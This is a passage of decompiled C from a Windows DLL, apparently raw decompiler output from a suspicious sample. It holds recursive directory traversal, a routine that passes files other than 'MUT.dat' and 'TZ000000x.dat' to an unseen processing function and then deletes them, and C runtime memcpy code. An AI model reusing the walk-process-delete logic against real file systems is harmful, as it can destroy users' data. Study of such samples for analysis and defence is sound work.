                *(int32_t *)(v57 - 4) = v51;
                v62 = v57 - 8;
                *(int32_t *)v62 = v61;
                v63 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161);
                v55 = v58;
                while (v63) {
                    // 0x1000a615
                    v57 = v62;
                    v58 = v55 + (int32_t)((*(char *)v51 & 16) == 0);
                    *(int32_t *)(v57 - 4) = v51;
                    v62 = v57 - 8;
                    *(int32_t *)v62 = v61;
                    v63 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161);
                    v55 = v58;
                }
                // 0x1000a62d
                v64 = v57 - 12;
                *(int32_t *)v64 = v61;
                FindClose(&g161);
                if (v58 > 3) {
                    // 0x1000a671
                    return _40___security_check_cookie_40_4();
                }
            }
            // 0x1000a639
            v52 = v64;
            v53 = *v49;
            v54 = *v44;
        }
    }
    int32_t v65 = v53;
    int32_t v66 = v52;
    *(int32_t *)(v66 - 4) = v45;
    int32_t v67 = v66 - 8; // 0x1000a64c
    *(int32_t *)v67 = v65;
    while (FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161)) {
        int32_t v68 = v54;
        int32_t v69 = v65;
        int32_t v70 = v67;
        v52 = v70;
        v53 = v69;
        v54 = v68;
        if ((*(char *)v45 & 16) != 0) {
            // 0x1000a5bd
            v52 = v70;
            v53 = v69;
            v54 = v68;
            if (*(char *)v50 != 46) {
                // 0x1000a5ca
                *(int32_t *)(v70 - 4) = v43;
                *(int32_t *)(v70 - 8) = v68;
                lstrcpyA((char *)&g161, (char *)&g161);
                *(int32_t *)(v70 - 12) = v68;
                *(char *)(v68 - 1 + lstrlenA((char *)&g161)) = 0;
                *(int32_t *)(v70 - 16) = v50;
                *(int32_t *)(v70 - 20) = v68;
                lstrcatA((char *)&g161, (char *)&g161);
                *(int32_t *)(v70 - 24) = (int32_t)"\\*";
                *(int32_t *)(v70 - 28) = v68;
                lstrcatA((char *)&g161, (char *)&g161);
                *(int32_t *)(v70 - 32) = v51;
                v59 = v70 - 36;
                *(int32_t *)v59 = v68;
                v60 = FindFirstFileA((char *)&g161, (struct _WIN32_FIND_DATAA *)&g161);
                v61 = (int32_t)v60;
                v56 = v59;
                v64 = v59;
                if (v60 != (int32_t *)-1) {
                    v57 = v56;
                    v58 = (*(char *)v51 & 16) == 0;
                    *(int32_t *)(v57 - 4) = v51;
                    v62 = v57 - 8;
                    *(int32_t *)v62 = v61;
                    v63 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161);
                    v55 = v58;
                    while (v63) {
                        // 0x1000a615
                        v57 = v62;
                        v58 = v55 + (int32_t)((*(char *)v51 & 16) == 0);
                        *(int32_t *)(v57 - 4) = v51;
                        v62 = v57 - 8;
                        *(int32_t *)v62 = v61;
                        v63 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161);
                        v55 = v58;
                    }
                    // 0x1000a62d
                    v64 = v57 - 12;
                    *(int32_t *)v64 = v61;
                    FindClose(&g161);
                    if (v58 > 3) {
                        // 0x1000a671
                        return _40___security_check_cookie_40_4();
                    }
                }
                // 0x1000a639
                v52 = v64;
                v53 = *v49;
                v54 = *v44;
            }
        }
        // 0x1000a645
        v65 = v53;
        v66 = v52;
        *(int32_t *)(v66 - 4) = v45;
        v67 = v66 - 8;
        *(int32_t *)v67 = v65;
    }
    // 0x1000a657
    *(int32_t *)(v66 - 12) = v65;
    FindClose(&g161);
    // 0x1000a65e
    return _40___security_check_cookie_40_4();
}

// Address range: 0x1000a690 - 0x1000a7f1
int32_t function_1000a690(int32_t a1) {
    // 0x1000a690
    int32_t v1; // bp-1340, 0x1000a690
    int32_t v2 = g66 ^ (int32_t)&v1; // 0x1000a6a1
    v1 = v2;
    if (v2 == 0) {
        // 0x1000a7d6
        return _40___security_check_cookie_40_4();
    }
    // 0x1000a6c3
    GetProcessHeap();
    char * lpFileName = (char *)v2; // 0x1000a6ce
    char * v3 = lpFileName; // bp-1360, 0x1000a6ce
    int32_t lpFindFileData; // bp-1336, 0x1000a690
    int32_t * v4 = FindFirstFileA(lpFileName, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x1000a6cf
    if (v4 == (int32_t *)-1) {
        // 0x1000a7d6
        return _40___security_check_cookie_40_4();
    }
    int32_t v5 = (int32_t)v4; // 0x1000a6cf
    int32_t v6 = (int32_t)&v3;
    int32_t v7; // 0x1000a690
    int32_t v8 = v7; // 0x1000a6f5
    int32_t v9 = v6; // 0x1000a6f5
    int32_t v10; // 0x1000a704
    int32_t v11; // 0x1000a705
    int32_t * v12; // 0x1000a70f
    int32_t v13; // 0x1000a718
    int32_t v14; // 0x1000a719
    int32_t v15; // 0x1000a72c
    int32_t v16; // 0x1000a72d
    uint32_t v17; // 0x1000a757
    int32_t v18; // 0x1000a763
    int32_t v19; // 0x1000a787
    int32_t * v20; // 0x1000a787
    int32_t v21; // 0x1000a78d
    if ((*(char *)(v6 + 16) & 16) == 0) {
        // 0x1000a6fb
        *(int32_t *)(v6 - 4) = (int32_t)"MUT.dat";
        v10 = v6 - 8;
        *(int32_t *)v10 = v6 + 60;
        v11 = lstrcmpA((char *)&g161, (char *)&g161);
        v8 = v7;
        v9 = v10;
        if (v11 != 0) {
            // 0x1000a70f
            v12 = (int32_t *)(v6 - 12);
            *v12 = (int32_t)"TZ0000001.dat";
            v13 = v6 - 16;
            *(int32_t *)v13 = v6 + 52;
            v14 = lstrcmpA((char *)&g161, (char *)&g161);
            v8 = v7;
            v9 = v13;
            if (v14 != 0) {
                // 0x1000a723
                *(int32_t *)(v6 - 20) = (int32_t)"TZ0000002.dat";
                v15 = v6 - 24;
                *(int32_t *)v15 = v6 + 44;
                v16 = lstrcmpA((char *)&g161, (char *)&g161);
                v8 = v7;
                v9 = v15;
                if (v16 != 0) {
                    // 0x1000a737
                    *(int32_t *)(v6 - 28) = v7;
                    *(int32_t *)(v6 - 32) = *v12;
                    *(int32_t *)(v6 - 36) = v7;
                    function_10002a30((int32_t)&g161);
                    *(int32_t *)(v6 - 40) = v6 + 300;
                    v17 = lstrlenA((char *)&g161) - 1;
                    if (v17 >= 1000) {
                        // 0x1000a7eb
                        function_1000b43d();
                        return __asm_int3();
                    }
                    // 0x1000a763
                    v18 = v6 + 296;
                    *(char *)(v17 + v18) = 0;
                    *(int32_t *)(v6 - 44) = v6 + 20;
                    *(int32_t *)(v6 - 48) = v18;
                    lstrcatA((char *)&g161, (char *)&g161);
                    if (g138 != 0) {
                        // 0x1000a7d6
                        return _40___security_check_cookie_40_4();
                    }
                    // 0x1000a787
                    v19 = v6 - 52;
                    v20 = (int32_t *)v19;
                    *v20 = *(int32_t *)(a1 + 0x189c);
                    v21 = v6 + 288;
                    *(int32_t *)(v6 - 56) = v21;
                    *(int32_t *)(v6 - 60) = v6 + 312;
                    *(int32_t *)(v6 - 64) = a1 + 0x1770;
                    function_100084b0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
                    *v20 = v21;
                    DeleteFileA((char *)&g161);
                    v8 = a1;
                    v9 = v19;
                }
            }
        }
    }
    int32_t v22 = v9;
    *(int32_t *)(v22 - 4) = v22 + 16;
    int32_t v23 = v22 - 8; // 0x1000a7c0
    *(int32_t *)v23 = v5;
    bool v24 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161); // 0x1000a7c1
    while (v24) {
        // 0x1000a6f0
        v6 = v23;
        int32_t v25 = v8;
        v8 = v25;
        v9 = v6;
        if ((*(char *)(v6 + 16) & 16) == 0) {
            // 0x1000a6fb
            *(int32_t *)(v6 - 4) = (int32_t)"MUT.dat";
            v10 = v6 - 8;
            *(int32_t *)v10 = v6 + 60;
            v11 = lstrcmpA((char *)&g161, (char *)&g161);
            v8 = v25;
            v9 = v10;
            if (v11 != 0) {
                // 0x1000a70f
                v12 = (int32_t *)(v6 - 12);
                *v12 = (int32_t)"TZ0000001.dat";
                v13 = v6 - 16;
                *(int32_t *)v13 = v6 + 52;
                v14 = lstrcmpA((char *)&g161, (char *)&g161);
                v8 = v25;
                v9 = v13;
                if (v14 != 0) {
                    // 0x1000a723
                    *(int32_t *)(v6 - 20) = (int32_t)"TZ0000002.dat";
                    v15 = v6 - 24;
                    *(int32_t *)v15 = v6 + 44;
                    v16 = lstrcmpA((char *)&g161, (char *)&g161);
                    v8 = v25;
                    v9 = v15;
                    if (v16 != 0) {
                        // 0x1000a737
                        *(int32_t *)(v6 - 28) = v25;
                        *(int32_t *)(v6 - 32) = *v12;
                        *(int32_t *)(v6 - 36) = v25;
                        function_10002a30((int32_t)&g161);
                        *(int32_t *)(v6 - 40) = v6 + 300;
                        v17 = lstrlenA((char *)&g161) - 1;
                        if (v17 >= 1000) {
                            // 0x1000a7eb
                            function_1000b43d();
                            return __asm_int3();
                        }
                        // 0x1000a763
                        v18 = v6 + 296;
                        *(char *)(v17 + v18) = 0;
                        *(int32_t *)(v6 - 44) = v6 + 20;
                        *(int32_t *)(v6 - 48) = v18;
                        lstrcatA((char *)&g161, (char *)&g161);
                        if (g138 != 0) {
                            // 0x1000a7d6
                            return _40___security_check_cookie_40_4();
                        }
                        // 0x1000a787
                        v19 = v6 - 52;
                        v20 = (int32_t *)v19;
                        *v20 = *(int32_t *)(a1 + 0x189c);
                        v21 = v6 + 288;
                        *(int32_t *)(v6 - 56) = v21;
                        *(int32_t *)(v6 - 60) = v6 + 312;
                        *(int32_t *)(v6 - 64) = a1 + 0x1770;
                        function_100084b0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
                        *v20 = v21;
                        DeleteFileA((char *)&g161);
                        v8 = a1;
                        v9 = v19;
                    }
                }
            }
        }
        // 0x1000a7bb
        v22 = v9;
        *(int32_t *)(v22 - 4) = v22 + 16;
        v23 = v22 - 8;
        *(int32_t *)v23 = v5;
        v24 = FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161);
    }
    // 0x1000a7cf
    *(int32_t *)(v22 - 12) = v5;
    FindClose(&g161);
    // 0x1000a7d6
    return _40___security_check_cookie_40_4();
}

// Address range: 0x1000a8b1 - 0x1000a8bc
// From class:    .?AVbad_alloc@std@@
// Type:          constructor
int32_t function_1000a8b1(void) {
    // 0x1000a8b1
    int32_t v1; // 0x1000a8b1
    *(int32_t *)v1 = (int32_t)&g3;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x1000a8bc - 0x1000a8c1
int32_t function_1000a8bc(void) {
    // 0x1000a8bc
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x1000a992 - 0x1000a9a1
int32_t _40___security_check_cookie_40_4(void) {
    // 0x1000a992
    int32_t v1; // 0x1000a992
    if (v1 != g66) {
        // 0x1000a99c
        return ___report_gsfailure();
    }
    // 0x1000a99a
    int32_t result; // 0x1000a992
    return result;
}

// Address range: 0x1000b1da - 0x1000b1e0
int32_t function_1000b1da(void) {
    // 0x1000b1da
    return __unlockexit();
}

// Address range: 0x1000b300 - 0x1000b305
// Demangled:     void __cdecl operator delete(void *)
void _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1) {
    // 0x1000b300
    _free(a1);
}

// Address range: 0x1000b43d - 0x1000b449
int32_t function_1000b43d(void) {
    // 0x1000b43d
    int32_t v1; // 0x1000b43d
    return ___report_securityfailure(8, v1);
}

// Address range: 0x1000b519 - 0x1000b527
// Demangled:     public: virtual __thiscall Concurrency::details::_AnonymousOriginator<unsigned int>::~_AnonymousOriginator<unsigned int>(void)
int32_t _3f__3f_1_3f__24__AnonymousOriginator_40_I_40_details_40_Concurrency_40__40_UAE_40_XZ(void) {
    // 0x1000b519
    int32_t v1; // 0x1000b519
    int32_t * v2 = (int32_t *)v1; // 0x1000b51a
    *v2 = (int32_t)&g4;
    return _3f__Type_info_dtor_40_type_info_40__40_CAXPAV1_40__40_Z(v2);
}

// Address range: 0x1000b6d7 - 0x1000b6e2
int32_t __cexit(void) {
    // 0x1000b6d7
    _doexit(0, 0, 1);
    // UNREACHABLE
}

// Address range: 0x1000b6e2 - 0x1000b6e6
int32_t function_1000b6e2(void) {
    // 0x1000b6e2
    int32_t result; // 0x1000b6e2
    return result;
}

// Address range: 0x1000b779 - 0x1000b77e
int32_t function_1000b779(int32_t a1) {
    // 0x1000b779
    int32_t result; // 0x1000b779
    return result;
}

// Address range: 0x1000b80e - 0x1000b817
int32_t __lockexit(void) {
    // 0x1000b80e
    return __lock(8);
}

// Address range: 0x1000b817 - 0x1000b820
int32_t __unlockexit(void) {
    // 0x1000b817
    return __unlock(8);
}

// Address range: 0x1000b93a - 0x1000b949
int32_t function_1000b93a(void) {
    // 0x1000b93a
    int32_t result; // 0x1000b93a
    int32_t v1; // 0x1000b93a
    if (*(int32_t *)(v1 + 16) != 0) {
        // 0x1000b940
        result = __unlock(8);
    }
    // 0x1000b948
    return result;
}

// Address range: 0x1000b949 - 0x1000b94f
int32_t function_1000b949(void) {
    // 0x1000b949
    return __SEH_epilog4();
}

// Address range: 0x1000be15 - 0x1000be28
int32_t function_1000be15(void) {
    // 0x1000be15
    return __unlock_file2(1, ___iob_func() + 32);
}

// Address range: 0x1000bf0a - 0x1000bf1d
int32_t function_1000bf0a(void) {
    // 0x1000bf0a
    int32_t result; // 0x1000bf0a
    int32_t v1; // 0x1000bf0a
    if (v1 == 0 && g68 != -1) {
        // 0x1000bf17
        result = __mtterm();
    }
    // 0x1000bf1c
    return result;
}

// Address range: 0x1000bf1d - 0x1000bf1f
int32_t function_1000bf1d(void) {
    // 0x1000bf1d
    int32_t result; // 0x1000bf1d
    return result;
}

// Address range: 0x1000c0f0 - 0x1000c734
int32_t function_1000c0f0(int32_t result3, int32_t a2, uint32_t a3) {
    int32_t result2 = a3 + a2; // 0x1000c102
    int32_t v1; // 0x1000c0f0
    int32_t v2; // 0x1000c0f0
    int32_t v3; // 0x1000c0f0
    int32_t v4; // 0x1000c0f0
    int32_t v5; // 0x1000c0f0
    int32_t v6; // 0x1000c0f0
    int32_t v7; // 0x1000c0f0
    int32_t v8; // 0x1000c0f0
    int32_t v9; // 0x1000c0f0
    int32_t v10; // 0x1000c0f0
    int32_t v11; // 0x1000c0f0
    int32_t v12; // 0x1000c0f0
    int32_t v13; // 0x1000c0f0
    int32_t v14; // 0x1000c0f0
    int32_t result; // 0x1000c0f0
    if (result3 > a2 == result2 > result3) {
        int32_t v15 = a3 - 4; // 0x1000c478
        int32_t v16 = v15 + a2; // 0x1000c478
        int32_t v17 = v15 + result3; // 0x1000c47c
        int32_t v18 = v17 & 3; // 0x1000c480
        if (v18 != 0) {
            // 0x1000c4ac
            g159 = a3;
            result = result3;
            v11 = v16;
            v5 = v17;
            v12 = v16;
            v6 = v17;
            v13 = v16;
            v7 = v17;
            switch (a3) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x1000c5dc;
                }
                case 2: {
                    goto lab_0x1000c5ec;
                }
                case 3: {
                    goto lab_0x1000c600;
                }
                default: {
                    // 0x1000c4b8
                    result = v18;
                  lab_0x1000c330:
                    // 0x1000c324
                    return result;
                }
            }
        } else {
            int32_t v19 = -((a3 / 4));
            g158 = v19;
            if (a3 < 4) {
                // 0x1000c324
                return result2;
            }
            int32_t v20 = a3 & 3; // 0x1000c48b
            __asm_rep_movsd_memcpy((char *)v17, (char *)v16, v19);
            int32_t v21 = v17 + (a3 & -4); // 0x1000c494
            g157 = v20;
            result = result3;
            v11 = v21;
            v5 = v21;
            v12 = v21;
            v6 = v21;
            v13 = v21;
            v7 = v21;
            switch (v20) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x1000c5dc;
                }
                case 2: {
                    goto lab_0x1000c5ec;
                }
                case 3: {
                    goto lab_0x1000c600;
                }
                default: {
                    // 0x1000c4a02
                    // UNREACHABLE
                }
            }
        }
    } else {
        // 0x1000c110
        if ((g83 & 2) != 0) {
            // 0x1000c11a
            __asm_rep_movsb_memcpy((char *)result3, (char *)a2, a3);
            // 0x1000c324
            return result3;
        }
        // 0x1000c121
        v1 = result2;
        if (a3 < 128) {
            goto lab_0x1000c2fb;
        } else {
            int32_t v22 = a2 ^ result3; // 0x1000c12f
            if ((v22 & 15) == 0) {
                // 0x1000c138
                if ((g67 & 2) != 0) {
                    int32_t v23 = a2 & 15; // 0x1000c623
                    int32_t v24 = a3; // 0x1000c628
                    int32_t v25 = a2; // 0x1000c628
                    int32_t v26 = result3; // 0x1000c628
                    if (v23 != 0) {
                        uint32_t v27 = 16 - v23; // 0x1000c705
                        if ((v27 & 3) != 0) {
                            while (true) {
                                // continue -> 0x1000c713
                            }
                        }
                        int32_t v28 = a3 - v27; // 0x1000c707
                        v24 = v28;
                        v25 = a2;
                        v26 = result3;
                        if (v27 >= 4) {
                            *(int32_t *)result3 = *(int32_t *)a2;
                            int32_t v29 = a2 + 4; // 0x1000c725
                            int32_t v30 = result3 + 4; // 0x1000c728
                            int32_t v31 = v27 / 4 - 1; // 0x1000c72b
                            v24 = v28;
                            v25 = v29;
                            v26 = v30;
                            int32_t v32 = v31; // 0x1000c72c
                            int32_t v33 = v29; // 0x1000c72c
                            int32_t v34 = v30; // 0x1000c72c
                            while (v31 != 0) {
                                // 0x1000c721
                                *(int32_t *)v34 = *(int32_t *)v33;
                                v29 = v33 + 4;
                                v30 = v34 + 4;
                                v31 = v32 - 1;
                                v24 = v28;
                                v25 = v29;
                                v26 = v30;
                                v32 = v31;
                                v33 = v29;
                                v34 = v30;
                            }
                        }
                    }
                    int32_t v35 = v25; // 0x1000c636
                    int32_t v36 = v26; // 0x1000c636
                    if (v24 >= 128) {
                        int128_t v37 = __asm_movdqa_9(*(int128_t *)v25); // 0x1000c640
                        int128_t v38 = __asm_movdqa_9(*(int128_t *)(v25 + 16)); // 0x1000c644
                        int128_t v39 = __asm_movdqa_9(*(int128_t *)(v25 + 32)); // 0x1000c649
                        int128_t v40 = __asm_movdqa_9(*(int128_t *)(v25 + 48)); // 0x1000c64e
                        __asm_movdqa(*(int128_t *)v26, v37);
                        __asm_movdqa(*(int128_t *)(v26 + 16), v38);
                        __asm_movdqa(*(int128_t *)(v26 + 32), v39);
                        __asm_movdqa(*(int128_t *)(v26 + 48), v40);
                        int128_t v41 = __asm_movdqa_9(*(int128_t *)(v25 + 64)); // 0x1000c666
                        int128_t v42 = __asm_movdqa_9(*(int128_t *)(v25 + 80)); // 0x1000c66b
                        int128_t v43 = __asm_movdqa_9(*(int128_t *)(v25 + 96)); // 0x1000c670
                        int128_t v44 = __asm_movdqa_9(*(int128_t *)(v25 + 112)); // 0x1000c675
                        __asm_movdqa(*(int128_t *)(v26 + 64), v41);
                        __asm_movdqa(*(int128_t *)(v26 + 80), v42);
                        __asm_movdqa(*(int128_t *)(v26 + 96), v43);
                        __asm_movdqa(*(int128_t *)(v26 + 112), v44);
                        int32_t v45 = v25 + 128; // 0x1000c68e
                        int32_t v46 = v26 + 128; // 0x1000c694
                        int32_t v47 = v24 / 128 - 1; // 0x1000c69a
                        int32_t v48 = v47; // 0x1000c69b
                        int32_t v49 = v45; // 0x1000c69b
                        int32_t v50 = v46; // 0x1000c69b
                        v35 = v45;
                        v36 = v46;
                        while (v47 != 0) {
                            // 0x1000c640
                            v37 = __asm_movdqa_9(*(int128_t *)v49);
                            v38 = __asm_movdqa_9(*(int128_t *)(v49 + 16));
                            v39 = __asm_movdqa_9(*(int128_t *)(v49 + 32));
                            v40 = __asm_movdqa_9(*(int128_t *)(v49 + 48));
                            __asm_movdqa(*(int128_t *)v50, v37);
                            __asm_movdqa(*(int128_t *)(v50 + 16), v38);
                            __asm_movdqa(*(int128_t *)(v50 + 32), v39);
                            __asm_movdqa(*(int128_t *)(v50 + 48), v40);
                            v41 = __asm_movdqa_9(*(int128_t *)(v49 + 64));
                            v42 = __asm_movdqa_9(*(int128_t *)(v49 + 80));
                            v43 = __asm_movdqa_9(*(int128_t *)(v49 + 96));
                            v44 = __asm_movdqa_9(*(int128_t *)(v49 + 112));
                            __asm_movdqa(*(int128_t *)(v50 + 64), v41);
                            __asm_movdqa(*(int128_t *)(v50 + 80), v42);
                            __asm_movdqa(*(int128_t *)(v50 + 96), v43);
                            __asm_movdqa(*(int128_t *)(v50 + 112), v44);
                            v45 = v49 + 128;
                            v46 = v50 + 128;
                            v47 = v48 - 1;
                            v48 = v47;
                            v49 = v45;
                            v50 = v46;
                            v35 = v45;
                            v36 = v46;
                        }
                    }
                    uint32_t v51 = v24 & 127; // 0x1000c630
                    if (v51 == 0) {
                        // 0x1000c324
                        return result3;
                    }
                    int32_t v52 = v35; // 0x1000c6a8
                    int32_t v53 = v36; // 0x1000c6a8
                    if (v51 >= 16) {
                        __asm_movdqa(*(int128_t *)v36, __asm_movdqa_9(*(int128_t *)v35));
                        int32_t v54 = v35 + 16; // 0x1000c6b8
                        int32_t v55 = v36 + 16; // 0x1000c6bb
                        int32_t v56 = v51 / 16 - 1; // 0x1000c6be
                        int32_t v57 = v56; // 0x1000c6bf
                        int32_t v58 = v54; // 0x1000c6bf
                        int32_t v59 = v55; // 0x1000c6bf
                        v52 = v54;
                        v53 = v55;
                        while (v56 != 0) {
                            // 0x1000c6b0
                            __asm_movdqa(*(int128_t *)v59, __asm_movdqa_9(*(int128_t *)v58));
                            v54 = v58 + 16;
                            v55 = v59 + 16;
                            v56 = v57 - 1;
                            v57 = v56;
                            v58 = v54;
                            v59 = v55;
                            v52 = v54;
                            v53 = v55;
                        }
                    }
                    uint32_t v60 = v24 & 15; // 0x1000c6c1
                    if (v60 == 0) {
                        // 0x1000c324
                        return result3;
                    }
                    int32_t v61 = v52; // 0x1000c6cb
                    int32_t v62 = v53; // 0x1000c6cb
                    if (v60 >= 4) {
                        *(int32_t *)v53 = *(int32_t *)v52;
                        int32_t v63 = v52 + 4; // 0x1000c6d1
                        int32_t v64 = v53 + 4; // 0x1000c6d4
                        int32_t v65 = v60 / 4 - 1; // 0x1000c6d7
                        int32_t v66 = v65; // 0x1000c6d8
                        int32_t v67 = v63; // 0x1000c6d8
                        int32_t v68 = v64; // 0x1000c6d8
                        v61 = v63;
                        v62 = v64;
                        while (v65 != 0) {
                            // 0x1000c6cd
                            *(int32_t *)v68 = *(int32_t *)v67;
                            v63 = v67 + 4;
                            v64 = v68 + 4;
                            v65 = v66 - 1;
                            v66 = v65;
                            v67 = v63;
                            v68 = v64;
                            v61 = v63;
                            v62 = v64;
                        }
                    }
                    int32_t v69 = v24 & 3; // 0x1000c6dc
                    int32_t v70 = v69; // 0x1000c6df
                    int32_t v71 = v61; // 0x1000c6df
                    if (v69 == 0) {
                        // 0x1000c324
                        return result3;
                    }
                    int32_t v72 = v62; // 0x1000c6df
                    *(char *)v72 = *(char *)v71;
                    v70--;
                    v71++;
                    v72++;
                    while (v70 != 0) {
                        // 0x1000c6e1
                        *(char *)v72 = *(char *)v71;
                        v70--;
                        v71++;
                        v72++;
                    }
                    // 0x1000c324
                    return result3;
                }
            }
            // 0x1000c146
            v1 = v22;
            if ((g83 & 1) == 0) {
                goto lab_0x1000c2fb;
            } else {
                int32_t result4 = result3 & 3;
                if (result4 != 0) {
                    // 0x1000c324
                    return result4;
                }
                // 0x1000c160
                v2 = v22;
                if ((a2 & 3) == 0) {
                    int32_t v73 = a3; // 0x1000c170
                    int32_t v74 = a2; // 0x1000c170
                    int32_t v75 = result3; // 0x1000c170
                    if ((result3 & 4) != 0) {
                        // 0x1000c172
                        *(int32_t *)result3 = *(int32_t *)a2;
                        v73 = a3 - 4;
                        v74 = a2 + 4;
                        v75 = result3 + 4;
                    }
                    int32_t v76 = v73; // 0x1000c183
                    int32_t v77 = v74; // 0x1000c183
                    int32_t v78 = v75; // 0x1000c183
                    if ((v75 & 8) != 0) {
                        // 0x1000c185
                        __asm_movq_10(*(int64_t *)v75, __asm_movq(*(int64_t *)v74));
                        v76 = v73 - 8;
                        v77 = v74 + 8;
                        v78 = v75 + 8;
                    }
                    // 0x1000c196
                    int32_t v79; // 0x1000c0f0
                    int32_t v80; // 0x1000c0f0
                    int32_t v81; // 0x1000c0f0
                    if ((v77 & 7) == 0) {
                        int32_t v82 = v77 - 8; // 0x1000c201
                        int128_t v83 = __asm_movdqa_9(*(int128_t *)v82); // 0x1000c209
                        int32_t v84 = v82;
                        int128_t v85 = __asm_movdqa_9(*(int128_t *)(v84 + 16)); // 0x1000c20c
                        int32_t v86 = v76 - 48; // 0x1000c211
                        int128_t v87 = __asm_movdqa_9(*(int128_t *)(v84 + 32)); // 0x1000c214
                        int32_t v88 = v84 + 48; // 0x1000c219
                        int128_t v89 = __asm_movdqa_9(*(int128_t *)v88); // 0x1000c219
                        int128_t v90 = __asm_movdqa_9(v85); // 0x1000c224
                        __asm_movdqa(*(int128_t *)v78, __asm_palignr(v85, v83, 8));
                        int128_t v91 = __asm_movdqa_9(v87); // 0x1000c232
                        __asm_movdqa(*(int128_t *)(v78 + 16), __asm_palignr(v87, v90, 8));
                        v83 = __asm_movdqa_9(v89);
                        __asm_movdqa(*(int128_t *)(v78 + 32), __asm_palignr(v89, v91, 8));
                        int32_t v92 = v78 + 48; // 0x1000c250
                        int32_t v93 = v86; // 0x1000c253
                        int32_t v94 = v92; // 0x1000c253
                        while (v86 > 47) {
                            // 0x1000c20c
                            v84 = v88;
                            v85 = __asm_movdqa_9(*(int128_t *)(v84 + 16));
                            v86 = v93 - 48;
                            v87 = __asm_movdqa_9(*(int128_t *)(v84 + 32));
                            v88 = v84 + 48;
                            v89 = __asm_movdqa_9(*(int128_t *)v88);
                            v90 = __asm_movdqa_9(v85);
                            __asm_movdqa(*(int128_t *)v94, __asm_palignr(v85, v83, 8));
                            v91 = __asm_movdqa_9(v87);
                            __asm_movdqa(*(int128_t *)(v94 + 16), __asm_palignr(v87, v90, 8));
                            v83 = __asm_movdqa_9(v89);
                            __asm_movdqa(*(int128_t *)(v94 + 32), __asm_palignr(v89, v91, 8));
                            v92 = v94 + 48;
                            v93 = v86;
                            v94 = v92;
                        }
                        // 0x1000c255
                        v79 = v86;
                        v81 = v84 + 56;
                        v80 = v92;
                    } else {
                        if ((v77 & 8) == 0) {
                            int32_t v95 = v77 - 4; // 0x1000c25a
                            int128_t v96 = __asm_movdqa_9(*(int128_t *)v95); // 0x1000c262
                            int32_t v97 = v95;
                            int128_t v98 = __asm_movdqa_9(*(int128_t *)(v97 + 16)); // 0x1000c264
                            int32_t v99 = v76 - 48; // 0x1000c269
                            int128_t v100 = __asm_movdqa_9(*(int128_t *)(v97 + 32)); // 0x1000c26c
                            int32_t v101 = v97 + 48; // 0x1000c271
                            int128_t v102 = __asm_movdqa_9(*(int128_t *)v101); // 0x1000c271
                            int128_t v103 = __asm_movdqa_9(v98); // 0x1000c27c
                            __asm_movdqa(*(int128_t *)v78, __asm_palignr(v98, v96, 4));
                            int128_t v104 = __asm_movdqa_9(v100); // 0x1000c28a
                            __asm_movdqa(*(int128_t *)(v78 + 16), __asm_palignr(v100, v103, 4));
                            v96 = __asm_movdqa_9(v102);
                            __asm_movdqa(*(int128_t *)(v78 + 32), __asm_palignr(v102, v104, 4));
                            int32_t v105 = v78 + 48; // 0x1000c2a8
                            int32_t v106 = v99; // 0x1000c2ab
                            int32_t v107 = v105; // 0x1000c2ab
                            while (v99 > 47) {
                                // 0x1000c264
                                v97 = v101;
                                v98 = __asm_movdqa_9(*(int128_t *)(v97 + 16));
                                v99 = v106 - 48;
                                v100 = __asm_movdqa_9(*(int128_t *)(v97 + 32));
                                v101 = v97 + 48;
                                v102 = __asm_movdqa_9(*(int128_t *)v101);
                                v103 = __asm_movdqa_9(v98);
                                __asm_movdqa(*(int128_t *)v107, __asm_palignr(v98, v96, 4));
                                v104 = __asm_movdqa_9(v100);
                                __asm_movdqa(*(int128_t *)(v107 + 16), __asm_palignr(v100, v103, 4));
                                v96 = __asm_movdqa_9(v102);
                                __asm_movdqa(*(int128_t *)(v107 + 32), __asm_palignr(v102, v104, 4));
                                v105 = v107 + 48;
                                v106 = v99;
                                v107 = v105;
                            }
                            // 0x1000c2ad
                            v79 = v99;
                            v81 = v97 + 52;
                            v80 = v105;
                        } else {
                            int32_t v108 = v77 - 12; // 0x1000c1a8
                            int128_t v109 = __asm_movdqa_9(*(int128_t *)v108); // 0x1000c1ad
                            int32_t v110 = v108;
                            int128_t v111 = __asm_movdqa_9(*(int128_t *)(v110 + 16)); // 0x1000c1b0
                            int32_t v112 = v76 - 48; // 0x1000c1b5
                            int128_t v113 = __asm_movdqa_9(*(int128_t *)(v110 + 32)); // 0x1000c1b8
                            int32_t v114 = v110 + 48; // 0x1000c1bd
                            int128_t v115 = __asm_movdqa_9(*(int128_t *)v114); // 0x1000c1bd
                            int128_t v116 = __asm_movdqa_9(v111); // 0x1000c1c8
                            __asm_movdqa(*(int128_t *)v78, __asm_palignr(v111, v109, 12));
                            int128_t v117 = __asm_movdqa_9(v113); // 0x1000c1d6
                            __asm_movdqa(*(int128_t *)(v78 + 16), __asm_palignr(v113, v116, 12));
                            v109 = __asm_movdqa_9(v115);
                            __asm_movdqa(*(int128_t *)(v78 + 32), __asm_palignr(v115, v117, 12));
                            int32_t v118 = v78 + 48; // 0x1000c1f4
                            int32_t v119 = v112; // 0x1000c1f7
                            int32_t v120 = v118; // 0x1000c1f7
                            while (v112 > 47) {
                                // 0x1000c1b0
                                v110 = v114;
                                v111 = __asm_movdqa_9(*(int128_t *)(v110 + 16));
                                v112 = v119 - 48;
                                v113 = __asm_movdqa_9(*(int128_t *)(v110 + 32));
                                v114 = v110 + 48;
                                v115 = __asm_movdqa_9(*(int128_t *)v114);
                                v116 = __asm_movdqa_9(v111);
                                __asm_movdqa(*(int128_t *)v120, __asm_palignr(v111, v109, 12));
                                v117 = __asm_movdqa_9(v113);
